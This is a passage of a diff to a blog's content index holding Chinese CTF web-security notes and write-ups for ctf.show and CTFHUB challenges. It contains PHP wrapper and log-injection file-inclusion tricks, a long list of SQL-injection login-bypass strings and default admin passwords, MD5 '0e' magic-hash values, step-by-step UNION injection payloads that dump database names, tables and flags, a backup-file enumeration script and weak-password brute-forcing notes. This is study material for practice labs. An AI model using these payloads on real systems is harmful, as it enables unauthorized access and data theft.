-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=php://input</span><br><span class="line">#GET /?url=php://input HTTP/1.1</span><br><span class="line">#可以访问请求的原始数据的只读流;</span><br><span class="line">#enctype=&quot;multipart/form-data&quot;的时候php://input是无效的;</span><br><span class="line"></span><br><span class="line">?url=php://output</span><br><span class="line">#GET /?url=php://output HTTP/1.1</span><br><span class="line">#一个只写的数据流，允许以print和echo一样的方式写入到输出缓冲区</span><br><span class="line"></span><br><span class="line">?url=php://fd</span><br><span class="line">#GET /?url=php://fd HTTP/1.1</span><br><span class="line">#允许直接访问指定的文件描述符。例如：php://fd/3引用了文件描述符3.</span><br></pre></td></tr></table></figure></div>
-
-<p><strong>查看PHP下的文夹使用ls</strong></p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p><strong>查看php下的文件夹中的文件内容cat</strong></p>
-<div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">system</span>(<span class="string">&quot;cat 文件夹名称&quot;</span>) <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></div>
-
-<p><strong>查看文件日志的文件夹</strong></p>
-<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">?url=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure></div>
-
-
-
-<h1 id="万能密码"><a href="#万能密码" class="headerlink" title="万能密码"></a>万能密码</h1><blockquote>
-<p> ‘r 1&#x3D;1 #</p>
-<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
-<p> 账号： admin<br> 密码：admin</p>
-<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
-<p> 账号：admin<br> 密码：admin888</p>
-<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
-<p> 账号：admin</p>
-<p> 密码：域名名</p>
-<p> &#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;</p>
-<h2 id="asp-aspx万能密码"><a href="#asp-aspx万能密码" class="headerlink" title="asp aspx万能密码"></a>asp aspx万能密码</h2><p> “or ‘a’&#x3D;”a<br> ‘’)or(‘a’&#x3D;’a<br> or 1&#x3D;1–<br> ‘or 1&#x3D;1–<br> a’or’ 1&#x3D;1–<br> “or 1&#x3D;1–<br> ‘or’a’&#x3D;’a<br> “or”&#x3D;”a’&#x3D;’a<br> ‘or”&#x3D;’<br> ‘or’&#x3D;’or’</p>
-<p> admin’or 1&#x3D;1#<br> ‘&#x3D;’&amp;password&#x3D;’&#x3D;’<br> admin’ or 1&#x3D;1#<br> admin’&#x2F;<strong>&#x2F;or&#x2F;</strong>&#x2F;1&#x3D;1#<br> admin’&#x2F;*<br> *&#x2F;‘</p>
-<p> 1 or ‘1’&#x3D;’1’&#x3D;1<br> 1 or ‘1’&#x3D;’1’ or 1&#x3D;1<br> ‘OR 1&#x3D;1%00<br> “or 1&#x3D;1%00<br> ‘xor## PHP万能密码</p>
-<p> ‘or’&#x3D;’or’</p>
-<p> ‘or 1&#x3D;1&#x2F;* 字符型 GPC是否开都可以使用</p>
-<p> User: something<br> Pass: ‘OR ‘1’&#x3D;’1</p>
-<p> jsp 万能密码</p>
-<p> 1’or’1’&#x3D;’1</p>
-<p> admin’ OR 1&#x3D;1&#x2F;*</p>
-<p> 用户名：admin 系统存在这个用户的时候 才用得上<br> 密码：1’or’1’&#x3D;’1</p>
-</blockquote>
-<h1 id="万能账号"><a href="#万能账号" class="headerlink" title="万能账号"></a>万能账号</h1><blockquote>
-<p>a’ or true #</p>
-<p>账号：…admin’ or ‘a’&#x3D;’a 密码随便填</p>
-</blockquote>
-<h1 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h1><blockquote>
-<hr>
-<p>&#x2F;or|-||&#x2F;|*|&lt;|&gt;|!|x|hex|(|)|+|select&#x2F;i</p>
-<blockquote>
-<ol>
-<li><code>/</code>：这个符号表示正则表达式模式的开始和结束。</li>
-<li><code>|</code>：这个符号代表“或”条件，意味着可以匹配两边的任何模式。</li>
-<li>\-, \, /, \*, &lt;, &gt;, !, x, hex, (, ), +, select&#96;: 这些是正则表达式将尝试匹配的实际模式。这些模式中的一些代表特定字符，而其他一些代表某些条件。<ul>
-<li><code>-</code>：匹配破折号字符。</li>
-<li><code>\\</code>：匹配反斜杠字符。</li>
-<li><code>\/</code>：匹配正斜杠字符。</li>
-<li><code>\\*</code>：匹配星号字符。</li>
-<li><code>\&lt;</code>：匹配单词的开头。</li>
-<li><code>\&gt;</code>：匹配单词的结尾。</li>
-<li><code>\!</code>：匹配感叹号字符。</li>
-<li><code>x</code>：匹配字母 ‘x’。</li>
-<li><code>hex</code>：匹配字符串 ‘hex’。</li>
-<li><code>\(</code>：匹配左括号。</li>
-<li><code>\)</code>：匹配右括号。</li>
-<li><code>\+</code>：匹配加号。</li>
-<li><code>select</code>：匹配字符串 ‘select’。</li>
-</ul>
-</li>
-</ol>
-</blockquote>
-<p>可以使用管道符||绕过和使用取反符号~~绕过</p>
-</blockquote>
-]]></content>
-      <tags>
-        <tag>笔记</tag>
-        <tag>ctf</tag>
-        <tag>web</tag>
-        <tag>实战</tag>
       </tags>
   </entry>
   <entry>
@@ -1440,6 +1132,314 @@ over</p>
         <tag>笔记</tag>
         <tag>python</tag>
         <tag>Learn</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>ctf.show_web</title>
+    <url>/2024/02/20/ctf-show-web/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h2 id="CTF-show秀"><a href="#CTF-show秀" class="headerlink" title="CTF.show秀"></a>CTF.show秀</h2><h3 id="Web4"><a href="#Web4" class="headerlink" title="Web4"></a>Web4</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_1.png" alt="ctf.show_web4_1"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web4_2.png" alt="ctf.show_web4_2"></p>
+<blockquote>
+<p>一个文件包含漏洞题目,<strong>日志注入</strong></p>
+</blockquote>
+<blockquote>
+<p><u>使用include()函数接收url参数,include()函数包含的文件会被执行,从而造成任意代码执行,或者配合伪协议获取敏感文件甚至getshell;</u></p>
+<p>本题伪协议不起作用,我们可以通过日志注入进行任意命令执行,从而getshell</p>
+</blockquote>
+<h3 id="Web5"><a href="#Web5" class="headerlink" title="Web5"></a>Web5</h3><p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_1.png" alt="ctf.show_web5_1"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctf.show_web5_2.png" alt="ctf.show_web5_2"></p>
+<blockquote>
+<p>传递两个参数,一个字符串,一个数字,并且两个参数的md5值必须相同,我们可以利用<strong>md5的0e漏洞进行绕过</strong></p>
+<p>通过GET请求传递两个参数v1和v2,并且参数v1必须是纯字母字符串,参数v2必须是数字或者数字字符串,并且两个参数的md5值必须相等</p>
+</blockquote>
+<blockquote>
+<p>0e绕过是指:0e开头的字符串在参与弱类型比较时,会被当做科学计数法,结果转换为0;</p>
+</blockquote>
+<blockquote>
+<ul>
+<li><strong>ctype_alpha()函数用于检测字符串中是否仅包含字母,是则返回true,否则返回false</strong></li>
+<li><strong>is_numeric()函数用于检测变量是否为数字或数字字符串,是则返回true,否则返回false</strong></li>
+</ul>
+</blockquote>
+<blockquote>
+<p>两个md5值进行弱类型比较</p>
+<blockquote>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">md5(&#x27;QNKCDZO&#x27;) == md5(240610708)</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p>MD5加密后会变成这个样子</p>
+<blockquote>
+<p>0e830400451993494058024219903391 &#x3D;&#x3D; 0e462097431906509019562988736854</p>
+</blockquote>
+<p>由于0e开头的字符串会转换为0,所以真正比较的过程会变成下面这样</p>
+<blockquote>
+<p>0&#x3D;&#x3D;0</p>
+</blockquote>
+<p>返回结果为true,也就是说0e开头的md5值进行弱类型比较时,结果相等</p>
+</blockquote>
+<p><em><strong><u>常用的MD5加密后以0E开头的有</u></strong></em></p>
+<blockquote>
+<p>​    QNKCDZO<br>​    240610708<br>​    byGcY<br>​    sonZ7y<br>​    aabg7XSs<br>​    aabC9RqS<br>​    s878926199a<br>​    s155964671a<br>​    s214587387a<br>​    s1091221200a</p>
+</blockquote>
+<h3 id="web7"><a href="#web7" class="headerlink" title="web7"></a>web7</h3><blockquote>
+<p>SQL联合注入</p>
+</blockquote>
+<blockquote>
+<p>打开题目看见文章列表，随机点击，点第一个</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_1.png" alt="ctfshow_web7_1"></p>
+<blockquote>
+<p>发现显示文章，本想搜索flag,发现没有，看见url中id&#x3D;1</p>
+<p><strong><u>从url地址栏中可以看到,页面通过文章的id值来查询文章内容,我们可以考虑SQL注入漏洞</u></strong></p>
+<p>首先判断注入点,输入以下payload,使SQL恒成立,发现显示文章成功</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/1</span><br></pre></td></tr></table></figure></div>
+
+<p>在输入以下payload,使SQL恒不成立,发现显示不出文章，</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">1/**/and/**/0</span><br></pre></td></tr></table></figure></div>
+
+<p>由此可以判断页面存在SQL注入,注入点为<u><strong>数值型注入</strong></u>,页面中有显示位,可以尝试<u><strong>联合注入</strong></u>进行脱库</p>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_2.png" alt="ctfshow_web7_2"></p>
+<blockquote>
+<p>先来判断显示位,此处id传一个**-1**,<strong>由于id通常不为负数,后端根据id查询不到内容</strong>,就只能展示联合查询的结果,从而帮助我们判断字段显示的位置</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,2,3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_3.png" alt="ctfshow_web7_3"></p>
+<blockquote>
+<p>判断数据库</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,database(),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_4.png" alt="ctfshow_web7_4"></p>
+<blockquote>
+<p>查看web数据库中的flag表</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=&quot;web7&quot;),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_5.png" alt="ctfshow_web7_5"></p>
+<blockquote>
+<p>查看flag表中的flag字段</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=&quot;flag&quot;),3#</span><br></pre></td></tr></table></figure></div>
+
+<p>也可使用</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_schema=&quot;web7&quot;/**/and/**/table_name=&quot;flag&quot;),3</span><br></pre></td></tr></table></figure></div>
+
+
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_6.png" alt="ctfshow_web7_6"></p>
+<blockquote>
+<p>查看目标FLAG</p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">-1/**/union/**/select/**/1,(select/**/flag/**/from/**/flag),3#</span><br></pre></td></tr></table></figure></div>
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web7_7.png" alt="ctfshow_web7_7"></p>
+<h2 id="CTFHUB"><a href="#CTFHUB" class="headerlink" title="CTFHUB"></a>CTFHUB</h2><h3 id="WEB-请求方式"><a href="#WEB-请求方式" class="headerlink" title="WEB_请求方式"></a><strong>WEB_请求方式</strong></h3><hr>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1.png" alt="请求方式"></p>
+<hr>
+<p>用burpsuit抓包,重放，将GET改成<strong>CTFHUB</strong>，发送即可获得flag</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_1.png" alt="BURPSUIT"></p>
+<p>falg</p>
+<hr>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_1_2.png" alt="flag"></p>
+<hr>
+<h3 id="信息页面隐藏"><a href="#信息页面隐藏" class="headerlink" title="信息页面隐藏"></a>信息页面隐藏</h3><hr>
+<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_1.png" alt="CTFHUB_WEB_2_1" style="zoom: 80%;">
+
+<p>看见页面信息繁杂，flag可能就隐藏在页面中，火狐快捷键*<u><strong>Ctrl+f</strong></u>*快捷查找，输入flag找到FLAG。</p>
+<hr>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_2_2.png" alt="CTFHUB_WEB_2_2"></p>
+<hr>
+<h3 id="备份文件下载——网站源码"><a href="#备份文件下载——网站源码" class="headerlink" title="备份文件下载——网站源码"></a>备份文件下载——网站源码</h3><p><strong>当开发人员在线上环境中对源代码进行了备份操作，并且将备份文件放在了 web 目录下，就会引起网站源码泄露。</strong></p>
+<hr>
+<blockquote>
+<h4 id="常见的网站源码备份文件后缀"><a href="#常见的网站源码备份文件后缀" class="headerlink" title="常见的网站源码备份文件后缀"></a>常见的网站源码备份文件后缀</h4><hr>
+<ul>
+<li>tar</li>
+<li>tar.gz</li>
+<li>zip</li>
+<li>rar</li>
+</ul>
+<h4 id="常见的网站源码备份文件名"><a href="#常见的网站源码备份文件名" class="headerlink" title="常见的网站源码备份文件名"></a>常见的网站源码备份文件名</h4><hr>
+<ul>
+<li>web</li>
+<li>website</li>
+<li>backup</li>
+<li>back</li>
+<li>www</li>
+<li>wwwroot</li>
+<li>temp</li>
+</ul>
+</blockquote>
+<img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_1.png" alt="CTFHUB_WEB_3_1" style="zoom:50%;">
+
+<p>文件下载，用python脚本，requests</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/&quot;</span></span><br><span class="line"></span><br><span class="line">li1=[<span class="string">&quot;web&quot;</span>,<span class="string">&quot;website&quot;</span>,<span class="string">&quot;backup&quot;</span>,<span class="string">&quot;back&quot;</span>,<span class="string">&quot;www&quot;</span>,<span class="string">&quot;wwwroot&quot;</span>,<span class="string">&quot;temp&quot;</span>]</span><br><span class="line">li2=[<span class="string">&quot; tar&quot;</span>,<span class="string">&quot;tar.gz&quot;</span>,<span class="string">&quot;zip&quot;</span>,<span class="string">&quot;rar&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> li1:</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> li2:</span><br><span class="line">        url_final = url +<span class="string">&quot;/&quot;</span>+i+<span class="string">&quot;.&quot;</span>+j</span><br><span class="line">        r=requests.get(url_final)</span><br><span class="line">        <span class="built_in">print</span>(r)</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;Response [404]&gt;//1</span><br><span class="line">&lt;Response [404]&gt;//2</span><br><span class="line">&lt;Response [404]&gt;//3</span><br><span class="line">&lt;Response [404]&gt;//4</span><br><span class="line">&lt;Response [404]&gt;//5</span><br><span class="line">&lt;Response [404]&gt;//6</span><br><span class="line">&lt;Response [404]&gt;//7</span><br><span class="line">&lt;Response [404]&gt;//8</span><br><span class="line">&lt;Response [404]&gt;//9</span><br><span class="line">&lt;Response [404]&gt;//10</span><br><span class="line">&lt;Response [404]&gt;//11</span><br><span class="line">&lt;Response [404]&gt;//12</span><br><span class="line">&lt;Response [404]&gt;//13</span><br><span class="line">&lt;Response [404]&gt;//14</span><br><span class="line">&lt;Response [404]&gt;//15</span><br><span class="line">&lt;Response [404]&gt;//16</span><br><span class="line">&lt;Response [404]&gt;//17</span><br><span class="line">&lt;Response [404]&gt;//18</span><br><span class="line">&lt;Response [200]&gt;//[200]19</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br><span class="line">&lt;Response [404]&gt;</span><br></pre></td></tr></table></figure></div>
+
+<p>得到备份文件”<a class="link" href="http://www.zip/">www.zip <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>“</p>
+<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip%E7%9B%B4%E6%8E%A5%E8%AE%BF%E9%97%AEwww.zip%E4%B8%8B%E8%BD%BD%EF%BC%8C%E5%BE%97%E5%88%B0%E5%8E%8B%E7%BC%A9%E5%8C%85www.zip%EF%BC%8C%E8%A7%A3%E5%8E%8B%E6%89%93%E5%BC%80%E6%96%87%E4%BB%B6%EF%BC%8C%E5%A6%82%E5%9B%BE%EF%BC%9A">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/www.zip直接访问www.zip下载，得到压缩包www.zip，解压打开文件，如图： <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_2.png" alt="CTFHUB_WEB_3_2"></p>
+<p>打开flag文件，发现没有flag</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_3_3.png" alt="CTFHUB_WEB_3_3"></p>
+<p>直接用</p>
+<p><a class="link" href="http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt%E5%BE%97%E5%88%B0flag">http://challenge-13acc99f8a511ebe.sandbox.ctfhub.com:10800/flag_3210627471.txt得到flag <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h2 id="Web-弱口令"><a href="#Web-弱口令" class="headerlink" title="Web_弱口令"></a>Web_弱口令</h2><blockquote>
+<p><strong>弱口令</strong></p>
+<p>通常认为容易被别人（他们有可能对你很了解）猜测到或被破解工具破解的口令均为弱口令。 </p>
+</blockquote>
+<p>使用<code>BurpSuite</code>中<code>Intruder</code>模块 ，即暴力破解模块(或在fuzz中使用)</p>
+<p>开启burp代理</p>
+<p>登录信息随便填，抓到request请求如下</p>
+<div class="highlight-container" data-rel="Bash"><figure class="iseeu highlight bash"><table><tr><td class="code"><pre><span class="line">POST / HTTP/1.1</span><br><span class="line">Host: challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:123.0) Gecko/20100101 Firefox/123.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 35</span><br><span class="line">Origin: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://challenge-2d13700d4987c4eb.sandbox.ctfhub.com:10800/</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">name=admin&amp;password=ctfhub&amp;referer=</span><br></pre></td></tr></table></figure></div>
+
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_2.png" alt="CTFHUB_WEB_4_2"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_3.png" alt="CTFHUB_WEB_4_3"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_4.png" alt="CTFHUB_WEB_4_4"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/CTFHUB_WEB_4_5.png" alt="CTFHUB_WEB_4_5"></p>
+]]></content>
+      <tags>
+        <tag>笔记</tag>
+        <tag>CTF</tag>
+        <tag>ctf.show</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>webctf</title>
+    <url>/2024/03/13/webctf/</url>
+    <content><![CDATA[<meta name="referrer" content="no-referrer">
+
+<h1 id="CTF-WEB"><a href="#CTF-WEB" class="headerlink" title="CTF_WEB"></a>CTF_WEB</h1><h2 id="SQL注入：联合注入"><a href="#SQL注入：联合注入" class="headerlink" title="SQL注入：联合注入"></a>SQL注入：联合注入</h2><p>1、数据库为mysql的爆库、爆表、爆字段、爆值的语句：</p>
+<p><strong>爆库：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,database();#查看此处有多字段</span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆表：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(table_name) from information_schema.tables where table_schema=database(); #   </span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆字段：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,group_concat(column_name) from information_schema.columns where table_name=&quot;表名&quot;; # </span><br></pre></td></tr></table></figure></div>
+
+<p><strong>爆值：</strong></p>
+<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">union select 1,2,3,字段 from 表名; #   </span><br></pre></td></tr></table></figure></div>
+
+<p>例子：</p>
+<blockquote>
+<p>常规套路：</p>
+<p>1、查字段</p>
+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>order<span class="comment">/**/</span>by<span class="comment">/**/</span><span class="number">3</span>#admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>#</span><br></pre></td></tr></table></figure></div>
+
+<p>2、查库(web2)</p>
+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">database</span>(),<span class="number">3</span>#</span><br></pre></td></tr></table></figure></div>
+
+<p>3、查表（flag,user）</p>
+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="symbol">&#x27;web2</span>&#x27;#</span><br></pre></td></tr></table></figure></div>
+
+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(table_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.tables<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_schema=<span class="title function_ invoke__">database</span>()#(模板)</span><br></pre></td></tr></table></figure></div>
+
+<p>4、查字段flag</p>
+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,<span class="title function_ invoke__">group_concat</span>(column_name),<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>information_schema.columns<span class="comment">/**/</span><span class="keyword">where</span><span class="comment">/**/</span>table_name=<span class="symbol">&#x27;flag</span>&#x27;#</span><br></pre></td></tr></table></figure></div>
+
+<p>5、查字段flag内容</p>
+<div class="highlight-container" data-rel="Rust"><figure class="iseeu highlight rust"><table><tr><td class="code"><pre><span class="line">admin&#x27;<span class="comment">/**/</span>or<span class="comment">/**/</span><span class="number">1</span>=<span class="number">1</span><span class="comment">/**/</span>union<span class="comment">/**/</span>select<span class="comment">/**/</span><span class="number">1</span>,flag,<span class="number">3</span><span class="comment">/**/</span>from<span class="comment">/**/</span>flag#</span><br></pre></td></tr></table></figure></div>
+
+
+</blockquote>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_1.png">*</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_2.png" alt="ctfshow_web6_2"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_3.png" alt="ctfshow_web6_3"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_4.png" alt="ctfshow_web6_4"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_5.png" alt="ctfshow_web6_5"></p>
+<p>注意查找字段图中红色字体错误了，应该为information_schema.columns&#x2F;**&#x2F;,图中column少了s</p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_6.png" alt="ctfshow_web6_6"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_7.png" alt="ctfshow_web6_7"></p>
+<p><img lazyload src="/images/loading.svg" data-src="https://gitee.com/kingwempity/images/raw/master/images/ctfshow_web6_8.png" alt="ctfshow_web6_8"></p>
+<h2 id="session文件包含"><a href="#session文件包含" class="headerlink" title="session文件包含"></a>session文件包含</h2><p>实战例子：</p>
+<p>CTFshow&#x2F; easy_include</p>
